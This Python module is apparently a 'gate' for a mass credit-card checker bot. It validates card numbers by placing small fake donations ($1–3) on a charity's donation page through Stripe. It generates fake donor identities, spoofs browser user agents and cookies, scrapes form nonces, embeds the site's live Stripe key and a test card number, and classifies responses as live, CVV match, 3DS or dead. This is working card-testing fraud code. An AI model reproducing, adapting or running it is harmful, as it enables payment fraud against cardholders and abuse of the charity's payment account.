# gatet4.py - CC Foundation Stripe Gateway
# Used by: /h4 (single 1.0-3.0$) & /v4 (mass 1.0-2.0$)
import requests
import json
import time
import random
import uuid
import re
from faker import Faker

fake = Faker("en_US")

# ========== CLASSIFICATION KEYS ==========
# ✅ Positive keys (check LAST)
success_keys = [
    "appreciate", "appreciated", "Payment Success", "Payment Successful!",
    "redirect_to", "thank", "Thanks", "Gracias", "Thank", "redirectUrl",
    "succeeded", "confirmation", "Successful!", "Thanks!", "Successful",
    "hide_form", "redirect_url", "Merci", "Form entry saved", "Success!",
    "donation", "charged", "payment_complete", "complete"
]

# ❌ Negative keys (check FIRST)
declined_keys = [
    "cannot be processed", "CARD_DECLINED", "Your card was declined.",
    "generic_decline", "cannot process your order", "declined", "card_declined"
]
insufficient_keys = [
    "Your card has insufficient funds.", "INSUFFICIENT_FUNDS",
    "insufficient_funds", "Insufficient Funds", "Insufficient", "insufficient"
]
expired_keys = ["card has expired", "expired_card"]
ccn_keys = ["security code is incorrect", "INCORRECT_CVV", "card number is incorrect", "incorrect_number"]
cvv_keys = [
    "transaction_not_allowed", "Your card does not support this type of purchase",
    "do_not_honor", "incorrect_cvc", "incorrect_cvv"
]
otp_keys = [
    "Verifying", "action_required", "verifying", "call_next_method",
    "requires_source_action", "CompletePaymentChallenge",
    "requires_action", "additional action before completion!", "nextAction",
    "three_d_secure", "redirect_to_3ds"
]

def classify_response(last):
    """Classify response - check negatives FIRST, then positives"""
    last_lower = last.lower()
    
    # ❌ Check negatives first
    if any(key.lower() in last_lower for key in declined_keys):
        return "DECLINED"
    if any(key.lower() in last_lower for key in insufficient_keys):
        return "INSUFFICIENT"
    if any(key.lower() in last_lower for key in expired_keys):
        return "EXPIRED"
    if any(key.lower() in last_lower for key in ccn_keys):
        return "CCN"
    if any(key.lower() in last_lower for key in cvv_keys):
        return "CVV"
    if any(key.lower() in last_lower for key in otp_keys):
        return "3DS"
    
    # ✅ Check positives last
    if any(key.lower() in last_lower for key in success_keys):
        return "HIT"
    
    return "DEAD"

# ========== HELPER FUNCTIONS ==========
def gen_random_user_agent():
    chrome_version = random.randint(120, 137)
    return random.choice([
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Mobile Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/537.36 Edg/{chrome_version}.0.0.0",
    ])

def gen_random_name():
    return fake.first_name(), fake.last_name()

def gen_random_email(first_name, last_name):
    domains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@protonmail.com"]
    return f"{first_name.lower()}{random.randint(1000, 99999)}{random.choice(domains)}"

def gen_random_guid():
    return f"{uuid.uuid4()}{random.randint(10000, 99999)}"

def gen_random_address():
    return fake.street_address()

def gen_random_postcode():
    return str(random.randint(10000, 99999))

# ========== PAGE SCRAPER ==========
def fetch_donate_page(session):
    """Visit donate page to get cookies and nonce"""
    try:
        # Visit homepage first
        session.get('https://ccfoundationorg.com/', timeout=15, allow_redirects=True)
        time.sleep(random.uniform(0.5, 1.0))
        
        # Visit donate page
        r = session.get('https://ccfoundationorg.com/donate/', timeout=15, allow_redirects=True)
        if r.status_code != 200:
            return None
        
        html = r.text
        
        # Extract nonce
        nonce_match = re.search(r'name=["\']_charitable_donation_nonce["\'].*?value=["\']([^"\']*)["\']', html, re.DOTALL)
        nonce = nonce_match.group(1) if nonce_match else None
        
        # Extract campaign_id
        campaign_match = re.search(r'campaign_id["\']\s*:\s*["\']?(\d+)["\']?', html)
        campaign_id = campaign_match.group(1) if campaign_match else "988003"
        
        # Extract form_id
        form_match = re.search(r'charitable_form_id["\']\s*:\s*["\']([^"\']*)["\']', html)
        form_id = form_match.group(1) if form_match else "6a440c2945e1e"
        
        return {'nonce': nonce, 'campaign_id': campaign_id, 'form_id': form_id}
    except:
        return None

# ========== MAIN TELE FUNCTION ==========
def Tele(ccx: str, amount: str = "1.00"):
    """
    Check credit card via ccfoundationorg.com
    Input: "card_number|month|year|cvv", amount
    Returns: (response_message, gateway_info)
    """
    
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) != 4:
        return "ERROR: Invalid format", f"Gate 4 ${amount}"
    
    n, mm, yy, cvc = parts
    if len(yy) == 4 and yy.startswith("20"):
        yy = yy[2:4]
    
    charge_amount = str(amount)
    gateway_name = f"Gate 4 ${charge_amount}"
    
    # Generate customer
    title = random.choice(["Mr", "Mrs", "Ms", "Dr"])
    first_name, last_name = gen_random_name()
    email = gen_random_email(first_name, last_name)
    full_name = f"{first_name} {last_name}"
    address = gen_random_address()
    postcode = gen_random_postcode()
    
    # IDs
    guid = gen_random_guid()
    muid = gen_random_guid()
    sid = gen_random_guid()
    client_session_id = gen_random_guid()
    wallet_config_id = str(uuid.uuid4())
    
    # Stripe key for ccfoundationorg.com
    stripe_key = "pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp"
    
    # Create session
    session = requests.Session()
    ua = gen_random_user_agent()
    session.headers.update({
        'User-Agent': ua,
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    })
    
    # Set cookies
    session.cookies.set('charitable_session', f'{uuid.uuid4().hex}||86400||82800')
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    
    # Sourcebuster cookies
    timestamp = int(time.time())
    session.cookies.set('sbjs_migrations', '1418474375998%3D1')
    session.cookies.set('sbjs_current_add', f'fd%3D2026-06-30%2019%3A04%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29')
    session.cookies.set('sbjs_first_add', f'fd%3D2026-06-30%2019%3A04%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F%7C%7C%7Crf%3D%28none%29')
    session.cookies.set('sbjs_current', 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29')
    session.cookies.set('sbjs_first', 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29')
    session.cookies.set('sbjs_session', 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fccfoundationorg.com%2Fdonate%2F')
    
    # ========== STEP 0: Fetch page for nonce ==========
    page_data = fetch_donate_page(session)
    time.sleep(random.uniform(0.3, 0.7))
    
    nonce = page_data.get('nonce') if page_data else None
    campaign_id = page_data.get('campaign_id', '988003') if page_data else '988003'
    form_id = page_data.get('form_id', '6a440c2945e1e') if page_data else '6a440c2945e1e'
    
    # ========== STEP 1: Create Payment Method ==========
    url_stripe = "https://api.stripe.com/v1/payment_methods"
    
    stripe_data = (
        f'type=card'
        f'&billing_details[name]={full_name.replace(" ", "+")}'
        f'&billing_details[email]={email.replace("@", "%40")}'
        f'&billing_details[address][line1]={address.replace(" ", "+")}'
        f'&billing_details[address][postal_code]={postcode}'
        f'&card[number]={n}'
        f'&card[cvc]={cvc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2F277e670b57%3B+stripe-js-v3%2F277e670b57%3B+card-element'
        f'&referrer=https%3A%2F%2Fccfoundationorg.com'
        f'&time_on_page={random.randint(50000, 200000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&client_attribution_metadata[wallet_config_id]={wallet_config_id}'
        f'&key={stripe_key}'
    )
    
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': ua,
    }
    
    try:
        response = session.post(url_stripe, headers=headers_stripe, data=stripe_data, timeout=30)
    except requests.RequestException as e:
        return f"NETWORK_ERROR: {str(e)[:80]}", gateway_name
    
    if response.status_code != 200:
        try:
            error_json = response.json()
            error_msg = error_json.get('error', {}).get('message', response.text[:200])
        except:
            error_msg = response.text[:200]
        
        error_lower = str(error_msg).lower()
        
        if any(k in error_lower for k in ['incorrect', 'invalid']) and 'number' in error_lower:
            return "CCN - Wrong card number", gateway_name
        if any(k in error_lower for k in ['cvc', 'cvv']):
            return "CVV - Wrong CVV", gateway_name
        if 'expired' in error_lower:
            return "EXPIRED - Card expired", gateway_name
        if 'insufficient' in error_lower:
            return "INSUFFICIENT - Low balance", gateway_name
        if 'declined' in error_lower:
            return "DECLINED - Card declined", gateway_name
        if any(k in error_lower for k in ['3ds', 'authentication', 'action_required']):
            return "3DS REQUIRED - Authentication needed", gateway_name
        
        return f"STRIPE_ERROR: {error_msg[:80]}", gateway_name
    
    try:
        response_json = response.json()
        if 'id' not in response_json:
            return "STRIPE_ERROR: No ID", gateway_name
        payment_method_id = response_json['id']
    except Exception as e:
        return f"JSON_PARSE_ERROR: {str(e)[:80]}", gateway_name
    
    # ========== STEP 2: Donation via WP AJAX ==========
    time.sleep(random.uniform(0.5, 1.0))
    
    ajax_url = "https://ccfoundationorg.com/wp-admin/admin-ajax.php"
    
    form_data = {
        'charitable_form_id': form_id,
        form_id: '',
        '_charitable_donation_nonce': nonce if nonce else 'c9f51f179a',
        '_wp_http_referer': '%2Fdonate%2F',
        'campaign_id': campaign_id,
        'description': 'CC Foundation Donation Form',
        'ID': '0',
        'donation_amount': 'custom',
        'custom_donation_amount': charge_amount,
        'recurring_donation': 'once',
        'title': title,
        'first_name': first_name,
        'last_name': last_name,
        'email': email,
        'address': address,
        'postcode': postcode,
        'gateway': 'stripe',
        'stripe_payment_method': payment_method_id,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }
    
    headers_ajax = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://ccfoundationorg.com',
        'Referer': 'https://ccfoundationorg.com/donate/',
        'User-Agent': ua,
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    try:
        r2 = session.post(ajax_url, data=form_data, headers=headers_ajax, timeout=30)
    except requests.RequestException as e:
        return f"NETWORK_ERROR: {str(e)[:80]}", gateway_name
    
    try:
        resp_json = r2.json()
        msg = resp_json.get('message', resp_json.get('msg', r2.text))
        
        # Check for errors array
        if 'errors' in resp_json and resp_json['errors']:
            error_msg = resp_json['errors'][0] if isinstance(resp_json['errors'], list) else str(resp_json['errors'])
            status = classify_response(error_msg)
        else:
            status = classify_response(str(msg))
        
        if status == "HIT":
            return f"APPROVED - Payment successful ✅ | ${charge_amount}", gateway_name
        elif status == "DECLINED":
            return f"DEAD - Card declined ❌ | ${charge_amount}", gateway_name
        elif status == "CCN":
            return f"CCN LIVE - CCN Match ✅ | ${charge_amount}", gateway_name
        elif status == "CVV":
            return f"CVV LIVE - CVV Match ✅ | ${charge_amount}", gateway_name
        elif status == "3DS":
            return f"3DS REQUIRED - 3D Secure 🔐 | ${charge_amount}", gateway_name
        elif status == "INSUFFICIENT":
            return f"INSUFFICIENT FUNDS - Low balance 💰 | ${charge_amount}", gateway_name
        elif status == "EXPIRED":
            return f"EXPIRED - Card expired 📅 | ${charge_amount}", gateway_name
        else:
            return f"DEAD - {str(msg)[:50]} | ${charge_amount}", gateway_name
            
    except:
        text = r2.text
        status = classify_response(text)
        
        if status == "HIT":
            return f"APPROVED - Payment successful ✅ | ${charge_amount}", gateway_name
        elif status == "DECLINED":
            return f"DEAD - Card declined ❌ | ${charge_amount}", gateway_name
        elif "thank" in text.lower():
            return f"APPROVED - Thank you ✅ | ${charge_amount}", gateway_name
        else:
            return f"DEAD - {text[:50]} | ${charge_amount}", gateway_name


# ========== TEST ==========
if __name__ == "__main__":
    print("=" * 60)
    print("Gate 4 - CC Foundation Stripe Checker")
    print("=" * 60)
    
    test_card = "4031630454189480|04|30|326"
    
    print(f"\n[+] Testing Single: {test_card}")
    print(f"[+] Amount: $1.00")
    print("-" * 60)
    result, gw = Tele(test_card, "1.00")
    print(f"Result: {result}")
    print(f"Gateway: {gw}")
    
    print(f"\n[+] Testing Mass: {test_card}")
    print(f"[+] Amount: $1.50")
    print("-" * 60)
    result, gw = Tele(test_card, "1.50")
    print(f"Result: {result}")
    print(f"Gateway: {gw}")
    print("=" * 60)
